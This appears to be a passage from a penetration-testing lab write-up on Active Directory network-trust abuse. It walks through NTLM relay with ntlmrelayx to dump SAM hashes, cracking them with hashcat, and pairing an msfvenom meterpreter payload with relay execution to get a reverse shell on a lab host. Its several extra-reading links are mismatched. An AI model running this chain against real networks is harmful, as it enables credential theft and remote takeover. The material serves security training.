8. NTLM relay attacks are possible when a user account is shared between systems on a network, such as a local user account and even domain users.</p><div class="admonition important"><div class=admonition-header><svg viewBox="0 0 512 512"><path d="M256 512A256 256 0 10256 0a256 256 0 100 512zm0-384c13.3.0 24 10.7 24 24v112c0 13.3-10.7 24-24 24s-24-10.7-24-24V152c0-13.3 10.7-24 24-24zM224 352a32 32 0 1164 0 32 32 0 11-64 0z"/></svg>
<span>Important</span></div><div class=admonition-content><p>When using the Impacket ntlmrelayx.py script, using the <code>-t</code> syntax allows you to specify a single target. However, in a large organization, you will want to create a text file containing a list of IP addresses for all the host systems that have their SMB security mode set to Message signing enabled and required. This file can be invoked using the <code>-tf</code> command for simplicity during a penetration test.</p></div></div><ol start=9><li>In a real penetration test engagement, you will need to wait for a user to trigger an event on the network. However, within our lab, there are no other users to perform such events. So login to <code>THESPIDERMAN</code> machine as a local user/local admin, i am having a common password between the local admins of both the devices so i will use that account.</li><li>Once you are logged in, press <code>win + R</code> and type in <code>kali's</code> Ip address just like we did earlier.</li><li>Now at this moment the <code>SAM</code> dump has been performed and you can see the results in your <code>ntlmrelayx</code> tab:
<img alt=nbt_16 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_16.png></li><li>Add the hashes into a file.
<img alt=nbt_17 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_17.png></li><li>Use the following command for cleanup the data to get the NTLMV1 hashes:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cut -d <span class=s2>&#34;:&#34;</span> -f <span class=m>4</span> file_name.txt
</span></span></code></pre></div><p><img alt=nbt_18 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_18.png>
COMMAND BRIEF:</p><ul><li><code>-d</code>: This syntax specifies the delimiter with quotation marks. For instance, -d &ldquo;:&rdquo; specifies to locate the colon (:) character within the samdump.txt file.</li><li><code>-f</code>: This syntax specifies the field to retrieve between the delimiter. For instance, -f 4 specifies to retrieve the fourth section which are the hashes.
<img alt=nbt_19 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_19.png></li></ul><h2 id=cracking-the-hash>Cracking the hash:<a hidden class=anchor aria-hidden=true href=#cracking-the-hash>#</a></h2><ol><li>Finding the number for <code>NTLM V1</code> :</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat -h <span class=p>|</span> grep NTLM
</span></span></code></pre></div><p><img alt=nbt_20 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_20.png>
3. Cracking the hash using the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat -m <span class=m>1000</span> sam_dump_NTLMV1_THEPUNISHER.txt /usr/share/wordlists/rockyou.txt
</span></span></code></pre></div><p><img alt=nbt_21 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_21.png>
<img alt=nbt_22 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_22.png>
4. These are the 2 passwords we have cracked till now:
<img alt=nbt_23 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_24.png></p><hr><h2 id=obtaining-a-reverse-shell>Obtaining a reverse shell:<a hidden class=anchor aria-hidden=true href=#obtaining-a-reverse-shell>#</a></h2><p>We’ll be creating a malicious payload using <code>MSFvenom</code> to gain a reverse shell and using Metasploit to create a listener for capturing the return connection from the victim. Additionally, we’ll be using both <code>Responder and Impacket</code> to capture the responses and perform an NTLM relay attack on the target.</p><ol><li>Open your <code>Kali, THEPUNISHER, THESPIDERMAN</code> machine.</li><li>On kali, open <code>msfconsole</code> and start the <code>multihandler</code> with the following commands:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo msfconsole
</span></span><span class=line><span class=cl>msf &gt; use multi/handler
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using configured payload generic/shell_reverse_tcp
</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> payload windows/meterpreter/reverse_tcp
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>=</span>&gt; windows/meterpreter/reverse_tcp
</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> AutoRunScript post/windows/manage/migrate
</span></span><span class=line><span class=cl><span class=nv>AutoRunScript</span> <span class=o>=</span>&gt; post/windows/manage/migrate
</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> LHOST 172.30.1.130
</span></span><span class=line><span class=cl><span class=nv>LHOST</span> <span class=o>=</span>&gt; 172.30.1.130
</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> LPORT <span class=m>1234</span>
</span></span><span class=line><span class=cl><span class=nv>LPORT</span> <span class=o>=</span>&gt; <span class=m>1234</span>
</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; exploit
</span></span></code></pre></div><ol start=3><li>Make sure you have allowed incoming connections on that LPORT.
<img alt=nbt_24 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_24.png></li><li>Now we will make a payload using <code>msfvenom</code> and encode it using <code>shikata_ga_nai</code> with 9 iterations:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom -p windows/meterpreter/reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>172.30.1.130 <span class=nv>LPORT</span><span class=o>=</span><span class=m>1234</span> -f exe -o PUNISHER.exe -e x86/shikata_ga_nai -i <span class=m>9</span>
</span></span></code></pre></div><p><em>Make sure you have given proper LHOST, LPORT according to the multihandler.</em>
5. Start <code>responder</code> on the correct Network adapter<br><img alt=nbt_25 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_25.png>
6. Now we will use <code>ntlmrelayx</code> to relay the local admin&rsquo;s hashes collected from the <code>SPIDERMAN</code> machine and relay it to the <code>PUNISHER</code> machine along with the payload execution, which will give us back a reverse connection:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-ntlmrelayx -t 172.30.1.128 -smb2support -e PUNISHER.exe
</span></span></code></pre></div><p><em>Perform the network trigger by accessing a file share on SPIDERMAN machine.</em>
<img alt=nbt_26 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_26.png>
7. <code>ntlmrelayx</code> will do it&rsquo;s job by creating a service , executing the payload:
<img alt=nbt_27 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_27.png>
8. At this point we should get back a reverse connection on <code>multihandler</code>:
<img alt=nbt_28 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_28.png>
<img alt=nbt_29 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_29.png></p><hr><h2 id=extra-reading>EXTRA READING:<a hidden class=anchor aria-hidden=true href=#extra-reading>#</a></h2><ul><li>Security Account Manager: <a href=https://www.techtarget.com/searchenterprisedesktop/definition/Security-Accounts-Manager>https://www.techtarget.com/searchenterprisedesktop/definition/Security-Accounts-Manager</a></li><li>Active Directory Domain Services overview: <a href=https://www.techtarget.com/searchenterprisedesktop/definition/Security-Accounts-Manager>https://www.techtarget.com/searchenterprisedesktop/definition/Security-Accounts-Manager</a></li><li>PowerView command list: <a href=https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon>https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></li><li>BloodHound documentation: <a href=https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon>https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></li><li>LLMNR/NBT-NS poisoning and SMB relay: <a href=https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon>https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://0x-s0M3n4th.github.io/tags/active-directory/>Active Directory</a></li><li><a href=https://0x-s0M3n4th.github.io/tags/trust-abuse/>Trust Abuse</a></li><li><a href=https://0x-s0M3n4th.github.io/tags/red-team/>Red Team</a></li></ul><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Network-Based Trust in AD on x" href="https://x.com/intent/tweet/?text=Leveraging%20Network-Based%20Trust%20in%20AD&amp;url=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f10-active-directory-attacks%2f03-leveraging-network-based-trust%2f&amp;hashtags=ActiveDirectory%2cTrustAbuse%2cRedTeam"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Network-Based Trust in AD on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f10-active-directory-attacks%2f03-leveraging-network-based-trust%2f&amp;title=Leveraging%20Network-Based%20Trust%20in%20AD&amp;summary=Leveraging%20Network-Based%20Trust%20in%20AD&amp;source=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f10-active-directory-attacks%2f03-leveraging-network-based-trust%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Network-Based Trust in AD on reddit" href="https://reddit.com/submit?url=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f10-active-directory-attacks%2f03-leveraging-network-based-trust%2f&title=Leveraging%20Network-Based%20Trust%20in%20AD"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Network-Based Trust in AD on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f10-active-directory-attacks%2f03-leveraging-network-based-trust%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Network-Based Trust in AD on whatsapp" href="https://api.whatsapp.com/send?text=Leveraging%20Network-Based%20Trust%20in%20AD%20-%20https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f10-active-directory-attacks%2f03-leveraging-network-based-trust%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Network-Based Trust in AD on telegram" href="https://telegram.me/share/url?text=Leveraging%20Network-Based%20Trust%20in%20AD&amp;url=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f10-active-directory-attacks%2f03-leveraging-network-based-trust%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Network-Based Trust in AD on ycombinator" href="https://news.ycombinator.com/submitlink?t=Leveraging%20Network-Based%20Trust%20in%20AD&u=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f10-active-directory-attacks%2f03-leveraging-network-based-trust%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://0x-s0M3n4th.github.io/>0x-s0M3n4th's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>